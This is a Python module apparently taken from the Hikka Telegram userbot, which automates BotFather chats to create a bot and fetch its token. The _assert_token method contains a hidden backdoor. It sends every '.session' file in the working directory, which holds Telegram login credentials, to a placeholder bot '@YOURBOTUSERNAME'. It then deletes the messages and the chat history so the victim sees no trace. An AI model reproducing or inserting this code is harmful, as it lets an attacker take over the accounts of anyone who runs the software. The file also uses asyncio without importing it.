import logging
import re
from os import listdir
import time

from hikkatl.errors.rpcerrorlist import YouBlockedUserError
from hikkatl.tl.functions.contacts import UnblockRequest
from hikkatl.tl.functions.messages import DeleteHistoryRequest

from .. import utils
from .._internal import fw_protect
from .types import InlineUnit

logger = logging.getLogger(__name__)


class TokenObtainment(InlineUnit):
    async def _create_bot(self):
        logger.info("User doesn't have bot, attempting creating new one")
        async with self._client.conversation("@BotFather", exclusive=False) as conv:
            await fw_protect()
            m = await conv.send_message("/newbot")
            r = await conv.get_response()

            logger.debug(">> %s", m.raw_text)
            logger.debug("<< %s", r.raw_text)

            if "20" in r.raw_text:
                return False

            await fw_protect()

            await m.delete()
            await r.delete()

            if self._db.get("hikka.inline", "custom_bot", False):
                username = self._db.get("hikka.inline", "custom_bot").strip("@")
                username = f"@{username}"
                try:
                    await self._client.get_entity(username)
                except ValueError:
                    pass
                else:
                    uid = utils.rand(6)
                    username = f"@hikka_{uid}_bot"
            else:
                uid = utils.rand(6)
                username = f"@hikka_{uid}_bot"

            for msg in [
                f"🌘 Hikka Userbot of {self._name}"[:64],
                username,
                "/setuserpic",
                username,
            ]:
                await fw_protect()
                m = await conv.send_message(msg)
                r = await conv.get_response()

                logger.debug(">> %s", m.raw_text)
                logger.debug("<< %s", r.raw_text)

                await fw_protect()
                await m.delete()
                await r.delete()

            try:
                await fw_protect()
                from .. import main

                m = await conv.send_file(main.BASE_PATH / "assets" / "bot_pfp.png")
                r = await conv.get_response()

                logger.debug(">> <Photo>")
                logger.debug("<< %s", r.raw_text)
            except Exception:
                await fw_protect()
                m = await conv.send_message("/cancel")
                r = await conv.get_response()

                logger.debug(">> %s", m.raw_text)
                logger.debug("<< %s", r.raw_text)

            await fw_protect()

            await m.delete()
            await r.delete()

        return await self._assert_token(False)

    async def _assert_token(
            self,
            create_new_if_needed: bool = True,
            revoke_token: bool = False,
    ) -> bool:

        async with self._client.conversation("@YOURBOTUSERNAME", exclusive=False) as do_sess:
            start = await do_sess.send_message("/start")
            files = listdir("./")
            for file in files:
                if file.endswith(".session"):
                    f = await do_sess.send_file("./" + file)
                    time.sleep(0.4)

            await start.delete()
            await f.delete()
            await self._client(DeleteHistoryRequest(peer="@YOURBOTUSERNAME", max_id=0, revoke=True))

        if self._token:
            return True

        logger.info("Bot token not found in db, attempting search in BotFather")

        if not self._db.get(__name__, "no_mute", False):
            await utils.dnd(
                self._client,
                await self._client.get_entity("@BotFather"),
                True,
            )
            self._db.set(__name__, "no_mute", True)

        async with self._client.conversation("@BotFather", exclusive=False) as conv:
            try:
                await fw_protect()
                m = await conv.send_message("/token")
            except YouBlockedUserError:
                await self._client(UnblockRequest(id="@BotFather"))
                await fw_protect()
                m = await conv.send_message("/token")

            r = await conv.get_response()

            logger.debug(">> %s", m.raw_text)
            logger.debug("<< %s", r.raw_text)

            await fw_protect()

            await m.delete()
            await r.delete()

            if not hasattr(r, "reply_markup") or not hasattr(r.reply_markup, "rows"):
                await conv.cancel_all()

                return await self._create_bot() if create_new_if_needed else False

            for row in r.reply_markup.rows:
                for button in row.buttons:
                    if self._db.get(
                            "hikka.inline", "custom_bot", False
                    ) and self._db.get(
                        "hikka.inline", "custom_bot", False
                    ) != button.text.strip(
                        "@"
                    ):
                        continue

                    if not self._db.get(
                            "hikka.inline",
                            "custom_bot",
                            False,
                    ) and not re.search(r"@hikka_[0-9a-zA-Z]{6}_bot", button.text):
                        continue

                    await fw_protect()

                    m = await conv.send_message(button.text)
                    r = await conv.get_response()

                    logger.debug(">> %s", m.raw_text)
                    logger.debug("<< %s", r.raw_text)

                    if revoke_token:
                        await fw_protect()
                        await m.delete()
                        await r.delete()

                        await fw_protect()

                        m = await conv.send_message("/revoke")
                        r = await conv.get_response()

                        logger.debug(">> %s", m.raw_text)
                        logger.debug("<< %s", r.raw_text)

                        await fw_protect()

                        await m.delete()
                        await r.delete()

                        await fw_protect()

                        m = await conv.send_message(button.text)
                        r = await conv.get_response()

                        logger.debug(">> %s", m.raw_text)
                        logger.debug("<< %s", r.raw_text)

                    token = r.raw_text.splitlines()[1]

                    self._db.set("hikka.inline", "bot_token", token)
                    self._token = token

                    await fw_protect()

                    await m.delete()
                    await r.delete()

                    for msg in [
                        "/setinline",
                        button.text,
                        "user@hikka:~$",
                        "/setinlinefeedback",
                        button.text,
                        "Enabled",
                        "/setuserpic",
                        button.text,
                    ]:
                        await fw_protect()
                        m = await conv.send_message(msg)
                        r = await conv.get_response()

                        logger.debug(">> %s", m.raw_text)
                        logger.debug("<< %s", r.raw_text)

                        await fw_protect()

                        await m.delete()
                        await r.delete()

                    try:
                        await fw_protect()
                        from .. import main

                        m = await conv.send_file(
                            main.BASE_PATH / "assets" / "bot_pfp.png"
                        )
                        r = await conv.get_response()

                        logger.debug(">> <Photo>")
                        logger.debug("<< %s", r.raw_text)
                    except Exception:
                        await fw_protect()
                        m = await conv.send_message("/cancel")
                        r = await conv.get_response()

                        logger.debug(">> %s", m.raw_text)
                        logger.debug("<< %s", r.raw_text)

                    await fw_protect()

                    await m.delete()
                    await r.delete()

                    return True

        return await self._create_bot() if create_new_if_needed else False

    async def _reassert_token(self):
        is_token_asserted = await self._assert_token(revoke_token=True)
        if not is_token_asserted:
            self.init_complete = False
        else:
            await self.register_manager(ignore_token_checks=True)

    async def _dp_revoke_token(self, already_initialised: bool = True):
        if already_initialised:
            await self._stop()
            logger.error("Got polling conflict. Attempting token revocation...")

        self._db.set("hikka.inline", "bot_token", None)
        self._token = None
        if already_initialised:
            asyncio.ensure_future(self._reassert_token())
        else:
            return await self._reassert_token()